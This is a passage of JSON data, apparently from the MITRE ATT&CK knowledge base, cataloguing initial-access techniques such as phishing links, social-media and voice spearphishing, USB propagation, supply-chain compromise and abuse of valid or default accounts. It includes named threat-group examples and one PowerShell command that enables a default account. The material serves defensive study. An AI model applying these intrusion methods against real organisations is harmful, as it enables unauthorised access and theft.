{"id": "C0036", "name": "Pikabot Distribution February 2024", "description": "Pikabot Distribution February 2024 utilized emails with hyperlinks leading to malicious ZIP archive files containing scripts to download and install Pikabot."}, {"id": "S0453", "name": "Pony", "description": "Pony has been delivered via spearphishing emails which contained malicious links."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has spread through emails with malicious links."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has used phishing emails with malicious links to gain initial access."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has been distributed through malicious links contained within spearphishing emails."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has crafted phishing emails containing malicious hyperlinks."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has sent e-mails with malicious links often crafted for specific targets."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 has been delivered to victims through e-mail links to malicious files."}, {"id": "S1124", "name": "SocGholish", "description": "SocGholish has been spread via emails containing malicious links."}, {"id": "S0646", "name": "SpicyOmelette", "description": "SpicyOmelette has been distributed via emails containing a malicious link that appears to be a PDF document."}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has been distributed through phishing emails containing a malicious URL."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used spearphishing e-mails with malicious links to deliver malware.  "}, {"id": "G0092", "name": "TA505", "description": "TA505 has sent spearphishing emails containing malicious links."}, {"id": "G1037", "name": "TA577", "description": "TA577 has sent emails containing links to malicious JavaScript files."}, {"id": "G0134", "name": "Transparent Tribe", "description": "Transparent Tribe has embedded links to malicious downloads in e-mails."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot has been delivered via malicious links in phishing e-mails."}, {"id": "G0010", "name": "Turla", "description": "Turla attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access."}, {"id": "S0476", "name": "Valak", "description": "Valak has been delivered via malicious links in e-mail."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has sent spearphishing emails with links to harvest credentials and deliver malware."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has sent phishing emails containing a link to an actor-controlled Google Drive document or other free online file hosting services."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has used malicious links in e-mails to deliver malware."}]}, {"name": "Spearphishing via Service", "description": "Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels.", "detailed_description": "Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels.\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.", "id": "T1566.003", "examples": [{"id": "G0130", "name": "Ajax Security Team", "description": "Ajax Security Team has used various social media channels to spearphish victims."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used the legitimate mailing service Constant Contact to send phishing e-mails."}, {"id": "G1012", "name": "CURIUM", "description": "CURIUM has used social media to deliver malicious files to victims."}, {"id": "G0070", "name": "Dark Caracal", "description": "Dark Caracal spearphished victims via Facebook and Whatsapp."}, {"id": "G1011", "name": "EXOTIC LILY", "description": "EXOTIC LILY has used the e-mail notification features of legitimate file sharing services for spearphishing."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used fake job advertisements sent via LinkedIn to spearphish targets."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used social media platforms, including LinkedIn and Twitter, to send spearphishing messages."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound used various social media channels (such as LinkedIn) as well as messaging services (such as WhatsApp) to spearphish victims."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet has used social media services to spear phish victims to deliver trojainized software."}, {"id": "S1100", "name": "Ninja", "description": "Ninja has been distributed to victims via the messaging app Telegram."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used LinkedIn to send spearphishing links."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group sent victims spearphishing messages via LinkedIn concerning fictitious jobs."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has sent loaders configured to run Ninja as zip archives via Telegram."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has used fake personas on social media to engage and target victims."}]}, {"name": "Spearphishing Voice", "description": "Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: Impersonation) and/or creating a sense of urgency or alarm for the recipient.", "detailed_description": "Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: Impersonation) and/or creating a sense of urgency or alarm for the recipient.\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on User Execution for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware, or install adversary-accessible remote management tools (Remote Access Software) onto their computer.\nAdversaries may also combine voice phishing with Multi-Factor Authentication Request Generation in order to trick users into divulging MFA credentials or accepting authentication prompts.", "id": "T1566.004", "examples": [{"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls to direct victims to download a remote monitoring and management (RMM) tool that would allow the adversary to remotely control their system."}]}]}, {"name": "Replication Through Removable Media", "description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.", "detailed_description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.\nMobile devices may also be used to infect PCs with malware if connected via USB. This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables. For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).", "id": "T1091", "examples": [{"id": "S0092", "name": "Agent.btz", "description": "Agent.btz drops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system, it opens autorun.inf and loads the malware."}, {"id": "S1074", "name": "ANDROMEDA", "description": "ANDROMEDA has been spread via infected USB keys."}, {"id": "G1007", "name": "Aoqin Dragon", "description": "Aoqin Dragon has used a dropper that employs a worm infection strategy using a removable device to breach a secure network environment."}, {"id": "G0007", "name": "APT28", "description": "APT28 uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted."}, {"id": "S0023", "name": "CHOPSTICK", "description": "Part of APT28's operation involved using CHOPSTICK modules to copy itself to air-gapped machines and using files written to USB sticks to transfer data and command traffic."}, {"id": "S0608", "name": "Conficker", "description": "Conficker variants used the Windows AUTORUN feature to spread through USB propagation."}, {"id": "S0115", "name": "Crimson", "description": "Crimson can spread across systems by infecting removable media."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel's selective infector modifies executables stored on removable media as a method of spreading across computers."}, {"id": "S0062", "name": "DustySky", "description": "DustySky searches for removable media and duplicates itself onto it."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 actors have mailed USB drives to potential victims containing malware that downloads and installs various backdoors, including in some cases for ransomware operations."}, {"id": "S0143", "name": "Flame", "description": "Flame contains modules to infect USB sticks and spread laterally to other Windows systems the stick is plugged into using Autorun functionality."}, {"id": "S0132", "name": "H1N1", "description": "H1N1 has functionality to copy itself to removable media."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has used malicious DLLs to spread malware to connected removable USB drives on infected machines."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used a customized PlugX variant which could spread through USB connections."}, {"id": "S0385", "name": "njRAT", "description": "njRAT can be configured to spread via removable drives."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has the ability to use removable drives to spread through compromised networks."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can spread itself by infecting other portable executable files on removable drives."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin has historically used infected USB media to spread to new victims."}, {"id": "S0028", "name": "SHIPSHAPE", "description": "APT30 may have used the SHIPSHAPE malware to move onto air-gapped networks. SHIPSHAPE targets removable drives to spread to other systems by modifying the drive to use Autorun to execute or by hiding legitimate document files and copying an executable to the folder with the same name as the legitimate document."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet can propagate via removable media using an autorun.inf file or the CVE-2010-2568 LNK vulnerability."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has attempted to transfer USBferry from an infected USB device by copying an Autorun function to the target machine."}, {"id": "S0130", "name": "Unknown Logger", "description": "Unknown Logger is capable of spreading to USB devices."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has copied itself to and infected removable drives for propagation."}, {"id": "S0452", "name": "USBferry", "description": "USBferry can copy its installer to attached USB storage devices."}, {"id": "S0136", "name": "USBStealer", "description": "USBStealer drops itself onto removable media and relies on Autorun to execute the malicious file when a user opens the removable media on another system."}], "sub_techniques": []}, {"name": "Supply Chain Compromise", "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.", "detailed_description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\nSupply chain compromise can take place at any stage of the supply chain including:\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.", "id": "T1195", "examples": [{"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has compromised information technology providers and software developers providing services to targets of interest, building initial access to ultimate victims at least in part through compromise of service providers that work with the victim organizations."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer has been distributed through cracked software downloads."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team staged compromised versions of legitimate software installers on forums to achieve initial, untargetetd access in victim environments."}], "sub_techniques": [{"name": "Compromise Software Dependencies and Development Tools", "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.", "detailed_description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.", "id": "T1195.001", "examples": [{"id": "S0658", "name": "XCSSET", "description": "XCSSET adds malicious code to a host's Xcode projects by enumerating CocoaPods target_integrator.rb files under the /Library/Ruby/Gems folder or enumerates all .xcodeproj folders under a given directory. XCSSET then downloads a script and Mach-O file into the Xcode project folder."}]}, {"name": "Compromise Software Supply Chain", "description": "Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.", "detailed_description": "Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.", "id": "T1195.002", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 gained access to production environments where they could inject malicious code into legitimate, signed files and widely distribute them to end users."}, {"id": "S0222", "name": "CCBkdr", "description": "CCBkdr was added to a legitimate, signed version 5.33 of the CCleaner software and distributed on CCleaner's distribution site."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has compromised legitimate web browser updates to deliver a backdoor. "}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly is associated with several supply chain compromises using malicious updates to compromise victims."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has placed trojanized installers for control system software on legitimate vendor app stores."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has gained initial access by compromising a victim's software supply chain."}, {"id": "G0115", "name": "GOLD SOUTHFIELD", "description": "GOLD SOUTHFIELD has distributed ransomware by backdooring software installers via a strategic web compromise of the site hosting Italian WinRAR."}, {"id": "S0493", "name": "GoldenSpy", "description": "GoldenSpy has been packaged with a legitimate tax preparation software."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet has distributed a trojanized version of PuTTY software for initial access to victims."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has distributed NotPetya by compromising the legitimate Ukrainian accounting software M.E.Doc and replacing a legitimate software update with a malicious one."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 gained initial network access to some victims via a trojanized update of SolarWinds Orion software."}, {"id": "S0562", "name": "SUNSPOT", "description": "SUNSPOT malware was designed and used to insert SUNBURST into software builds of the SolarWinds Orion IT management product."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has compromised the Able Desktop installer to gain access to victim's environments."}]}, {"name": "Compromise Hardware Supply Chain", "description": "Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.", "detailed_description": "Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.", "id": "T1195.003", "examples": []}]}, {"name": "Trusted Relationship", "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.", "detailed_description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, Valid Accounts used by the other party for access to internal network systems may be compromised and used.\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.", "id": "T1199", "examples": [{"id": "G0007", "name": "APT28", "description": "Once APT28 gained access to the DCCC network, the group then proceeded to use that access to compromise the DNC network."}, {"id": "G0016", "name": "APT29", "description": "APT29 has compromised IT, cloud services, and managed services providers to gain broad access to multiple customers for subsequent operations."}, {"id": "G0115", "name": "GOLD SOUTHFIELD", "description": "GOLD SOUTHFIELD has breached Managed Service Providers (MSP's) to deliver malware to MSP customers."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has accessed internet-facing identity providers such as Azure Active Directory and Okta to target specific organizations."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used legitimate access granted to Managed Service Providers in order to access victims of interest."}, {"id": "G1005", "name": "POLONIUM", "description": "POLONIUM has used compromised credentials from an IT company to target downstream customers including a law firm and aviation company."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has gained access to a contractor to pivot to the victim\u2019s infrastructure."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used dedicated network connections from one victim organization to gain unauthorized access to a separate organization. Additionally, Sandworm Team has accessed Internet service providers and telecommunication entities that provide mobile connectivity."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 gained access through compromised accounts at cloud solution partners, and used compromised certificates issued by Mimecast to authenticate to Mimecast customer systems."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has compromised third party service providers to gain access to victim's environments."}], "sub_techniques": []}, {"name": "Valid Accounts", "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.", "detailed_description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.", "id": "T1078", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team used valid accounts on the corporate network to escalate privileges, move laterally, and establish persistence within the corporate network. "}, {"id": "G1024", "name": "Akira", "description": "Akira uses valid account information to remotely access victim networks, such as VPN credentials."}, {"id": "G0026", "name": "APT18", "description": "APT18 actors leverage legitimate credentials to log into external remote services."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used a compromised account to access an organization's VPN infrastructure."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used valid accounts for initial access and privilege escalation."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used stolen credentials to compromise Outlook Web Access (OWA)."}, {"id": "G0096", "name": "APT41", "description": "APT41 used compromised credentials to log on to other systems."}, {"id": "G0001", "name": "Axiom", "description": "Axiom has used previously compromised administrative accounts to escalate privileges."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles used compromised VPN accounts."}, {"id": "G0008", "name": "Carbanak", "description": "Carbanak actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used a valid account to maintain persistence via scheduled task."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has used compromised user accounts to deploy payloads and create system services."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has compromised user credentials and used valid accounts for operations."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack used hard-coded credentials to gain access to a network share."}, {"id": "S0038", "name": "Duqu", "description": "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor."}, {"id": "G0085", "name": "FIN4", "description": "FIN4 has used legitimate credentials to hijack email communications."}, {"id": "G0053", "name": "FIN5", "description": "FIN5 has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment."}, {"id": "G0037", "name": "FIN6", "description": "To move laterally on a victim network, FIN6 has used credentials stolen from various systems on which it gathered usernames and password hashes."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has harvested valid administrative credentials for lateral movement."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used valid accounts for persistence and lateral movement."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used valid credentials with various services during lateral movement."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM leveraged valid accounts to maintain access to a victim network."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used a compromised Exchange account to search mailboxes and create new Exchange accounts."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has used compromised valid accounts for access to victim environments."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has used valid accounts for initial access and lateral movement. Indrik Spider has also maintained access to the victim environment through the VPN infrastructure."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer can use supplied user credentials to execute processes and stop services."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used credential dumpers or stealers to obtain legitimate credentials, which they used to gain access to victim accounts."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing has used valid SSH credentials to access remote hosts."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has used compromised credentials and/or session tokens to gain access into a victim's VPN, VDI, RDP, and IAMs."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used administrator credentials to gain access to restricted network segments."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has obtained valid accounts to gain initial access."}, {"id": "S0362", "name": "Linux Rabbit", "description": "Linux Rabbit acquires valid SSH accounts through brute force. "}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used valid accounts including shared between Managed Service Providers and clients to move between the two environments."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used compromised VPN accounts to gain access to victim systems."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used compromised credentials to access other systems on a victim network."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used valid VPN credentials to gain initial access."}, {"id": "G0011", "name": "PittyTiger", "description": "PittyTiger attempts to obtain legitimate credentials during operations."}, {"id": "G1040", "name": "Play", "description": "Play has used valid VPN accounts to achieve initial access."}, {"id": "G1005", "name": "POLONIUM", "description": "POLONIUM has used valid compromised credentials to gain access to victim environments."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team have used previously acquired legitimate credentials prior to attacks."}, {"id": "S0053", "name": "SeaDuke", "description": "Some SeaDuke samples have a module to extract email from Microsoft Exchange servers using compromised credentials."}, {"id": "G0091", "name": "Silence", "description": "Silence has used compromised credentials to log on to other systems and escalate privileges."}, {"id": "G0122", "name": "Silent Librarian", "description": "Silent Librarian has used compromised credentials to obtain unauthorized access to online accounts."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used different compromised credentials for remote access and to move laterally."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has used stolen credentials to sign into victim email accounts."}, {"id": "G0039", "name": "Suckfly", "description": "Suckfly used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon relies primarily on valid credentials for persistence."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used valid credentials for privileged accounts with the goal of accessing domain controllers."}], "sub_techniques": [{"name": "Default Accounts", "description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.", "detailed_description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen Private Keys or credential materials to legitimately connect to remote environments via Remote Services.", "id": "T1078.001", "examples": [{"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has abused default user names and passwords in externally-accessible IP cameras for initial access."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has leveraged default credentials for authenticating myWebMethods (WMS) and QLogic web management interface to gain initial access."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used the built-in administrator account to move laterally using RDP and Impacket."}, {"id": "S0537", "name": "HyperStack", "description": "HyperStack can use default credentials to connect to IPC$ shares on remote machines."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound enabled and used the default system managed account, DefaultAccount, via \"powershell.exe\" /c net user DefaultAccount /active:yes to connect to a targeted Exchange server over RDP."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet infected WinCC machines via a hardcoded database server password."}]}, {"name": "Domain Accounts", "description": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.", "detailed_description": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.", "id": "T1078.002", "examples": [{"id": "G1030", "name": "Agrius", "description": "Agrius attempted to acquire valid credentials for victim environments through various means to enable follow-on lateral movement."}, {"id": "G0022", "name": "APT3", "description": "APT3 leverages valid accounts after gaining credentials for use within the victim domain."}, {"id": "G1023", "name": "APT5", "description": "APT5 has used legitimate account credentials to move laterally through compromised environments."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda used multiple mechanisms to capture valid user accounts for victim domains to enable lateral movement and access to additional hosts in victim environments."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used compromised domain accounts to gain access to the target environment."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has obtained highly privileged credentials such as domain administrator in order to deploy malware."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use known credentials to run commands and spawn processes as a domain user account."}, {"id": "S1024", "name": "CreepySnail", "description": "CreepySnail can use stolen credentials to authenticate on target networks."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors used compromised VPN accounts for lateral movement on targeted networks."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has collected credentials from infected systems, including domain accounts."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used domain administrator accounts after dumping LSASS process memory."}, {"id": "G0019", "name": "Naikon", "description": "Naikon has used administrator credentials for lateral movement in compromised networks."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used domain accounts to gain further access to victim systems."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used compromised domain administrator credentials as part of their lateral movement."}, {"id": "C0023", "name": "Operation Ghost", "description": "For Operation Ghost, APT29 used stolen administrator credentials for lateral movement on compromised networks."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used domain credentials, including domain admin, for lateral movement and privilege escalation."}, {"id": "G1040", "name": "Play", "description": "Play has used valid domain accounts for access."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk can use stolen domain admin accounts to move laterally within a victim domain."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used stolen credentials to access administrative accounts within the domain."}, {"id": "S0140", "name": "Shamoon", "description": "If Shamoon cannot access shares using current privileges, it attempts access using hard coded, domain-specific credentials gathered earlier in the intrusion."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": 